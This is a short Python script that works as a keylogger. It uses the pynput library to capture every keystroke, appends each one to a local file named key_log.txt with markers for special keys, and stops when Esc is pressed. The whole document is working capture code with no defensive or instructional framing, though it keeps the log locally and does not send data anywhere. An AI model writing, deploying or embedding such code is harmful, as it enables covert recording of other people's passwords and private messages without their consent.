from pynput.keyboard import Key, Listener

# Path to log file where keystrokes will be saved
log_file = "key_log.txt"

# This function will be called whenever a key is pressed
def on_press(key):
    try:
        # Write the key to the log file
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (like arrow keys, enter, etc.)
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f"[{key}]")

# This function will be called when a key is released
def on_release(key):
    # You can stop the listener by returning False, e.g., stop on pressing ESC
    if key == Key.esc:
        return False

# Starting the listener for key press and release events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()